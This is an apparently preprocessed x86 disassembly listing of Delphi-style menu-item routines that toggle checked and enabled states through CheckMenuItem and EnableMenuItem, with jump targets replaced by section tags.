mov ebx [ ebp - 0x20 ]
mov ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x20 ]
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
mov eax [ ebp - 0x18 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x10
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_40ab90
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x18 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax [ ebp - 0x2c ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov [ ebp - 0x2d ] 0x0
jmp r-xdata
mov [ ebp - 0x2d ] 0x0
mov eax [ ebp - 0x2c ]
movzx eax [ eax + 0x68 ]
mov [ ebp - 0x2d ] al
jmp r-xdata
mov eax [ ebp - 0x20 ]
movzx ebx [ eax + 0x60 ]
test bx bx
je r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x34 ]
call sub_4070fc
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_45b1f0
mov ecx [ ebp - 0x40 ]
mov eax [ ebp - 0x20 ]
mov edx [ eax + 0x34 ]
lea eax [ ebp - 0x34 ]
call sub_407564
jmp r-xdata
movzx eax [ ebp - 0x2d ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
call sub_45c330
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
add eax 0x7
mov edx [ ebp - 0x18 ]
add [ edx ] eax
sub_45ee40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx esi
call sub_407768
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_4070a8
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_45ee68
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45efdc
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_45efec
cmp ebx eax
je r-xdata
movzx edx [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45eeb4
sub_45eeb4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45c284
push eax
call CheckMenuItem
mov eax esi
call sub_45ee68
sub_45ef08
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_45efdc
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
test [ esi + 0x1c ] 0x2
jne r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45c284
push eax
call EnableMenuItem
sub_45ef80
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_45f34c
mov edx eax
mov ecx ebx
mov eax edi
call sub_45c224
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_45ee68
sub_45efec
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4305a0
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45b148
sub_45f05c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_45efdc
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45f044
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_45f380
mov ecx ebx
mov edx esi
mov eax edi
call sub_45f168
sub_45f0a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45efdc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45efec
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_45f0fc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x40 ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_45efdc
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45efec
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45efec
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_45f168
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_45b148
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx + 0x5c ] eax
movzx ecx [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_45c224
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_430658
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_45f3ec
cmp [ ebx + 0xac ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_45efdc
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45c150
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4305a0
movzx eax [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4305a0
movzx edx [ eax + 0x3f ]
mov eax esi
call sub_45ef80
sub_45f224
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45b148
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_45efdc
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45c150
mov eax ebx
call sub_45efdc
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4305a0
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_430438
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0xac ] 0x0
je r-xdata
sub_45f29c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
movzx edx [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45eeb4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45efc4
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_45efc4
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_45f364
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45efdc
mov edx eax
mov ecx esi
mov eax ebx
call sub_45f168
pop esi
pop ebx
retn
sub_45f380
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45f34c
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_45f224
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45b148
sub_45f3a8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_45f3ec
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_45f3ec
jmp r-xdata
mov eax ebx
call sub_45c150
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_4617d4
sub_45f448
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ ebx + 0x4c ] eax
sub_45f470
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_4055f0
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45f708
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xfff0
call sub_40587c
mov edx ebx
mov eax edi
call sub_43c22c
mov eax ebx
mov si 0xffef
call sub_40587c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_45f4e0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov [ esi + 0x4c ] eax
sub_45f514
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_45efdc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45efec
mov edx [ eax ]
call [ edx + 0x44 ]
inc esi
dec ebx
jne r-xdata
sub_45f554
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45f380
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ esi + 0x38 ]
mov edx ebx
call sub_45f364
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45f364
sub_45f5b8
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_45ee68
sub_45f5e4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
movzx eax [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45ee40
cmp [ esi + 0x34 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x69 ]
mov eax esi
call sub_45eeb4
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x6a ]
mov eax esi
call sub_45ef08
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_4070a8
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45f034
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
movzx edx [ edi + 0x6c ]
mov eax esi
call sub_45ef80
cmp [ esi + 0x3f ] 0x0
jne r-xdata
movzx edx [ edi + 0x84 ]
mov eax esi
call sub_45f010
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x86 ]
mov eax esi
call sub_45f024
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45f708
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45efc4
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xfff0
call sub_40587c
sub_45f72c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f74c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f76c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f78c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f7ac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f7cc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f7ec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f80c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f82c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45f84c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43139c
movzx edx [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_48cb60
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_48cd4c
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_48cdac
mov edx [ ebx + 0x34 ]
mov eax edi
call sub_48c9f8
movzx edx [ ebx + 0x3e ]
mov eax edi
call sub_48ce6c
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x38 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45f8c8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_43c52c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45efc4
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45f470
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45f91c
jmp r-xdata
xor edx edx
mov eax esi
call sub_45c0d8
sub_45f91c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_48a414
mov eax ebx
call sub_45f98c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_48a458
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_43c22c
sub_45f964
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45f964
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_45b69c
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45f3ec
mov eax ebx
pop esi
pop ebx
retn
sub_45f9a0
push ebx
push esi
push edi
mov edi eax
mov esi ecx
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
mov ebx edx
mov edx [ ebx ]
mov eax edi
call sub_45f364
add ebx 0x4
dec esi
jne r-xdata
sub_45f9c4
push ebx
push esi
mov esi eax
mov eax esi
call sub_45efdc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_45efec
call sub_4055f0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_45f9f0
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_407ae0
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4078a0
sub_45fa20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4070fc
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_45faa4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45fc23
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ esi ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ esi ]
mov eax esi
call sub_406a50
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
cmp al 0xf
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fc2a
lea eax [ ebp - 0x14 ]
mov edx 0x2
call j_sub_4068c4
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_407914
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx ebx
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4077d0
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_407768
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov edx [ esi ]
mov eax esi
call sub_406a50
mov eax [ esi ]
movzx eax [ eax + edi * 2 - 0x2 ]
call sub_40d410
cmp al 0x7
je r-xdata
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_407648
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4077d0
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_407648
jmp r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov edx [ esi ]
mov eax esi
call sub_406a50
sub_45fc78
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46019a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x25 ] 0x0
test bl bl
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4070fc
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_460163
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x2c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x8 ] eax
mov eax esi
call sub_45efdc
dec eax
test eax eax
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_4070fc
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x30 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4601a1
lea eax [ ebp - 0x48 ]
mov edx 0x4
call j_sub_4068c4
lea eax [ ebp - 0x24 ]
mov edx 0x4
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax esi
call sub_460614
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc [ ebp - 0x30 ]
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_45efec
mov eax [ eax + 0x34 ]
mov edx r-xdata
call sub_407768
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x25 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
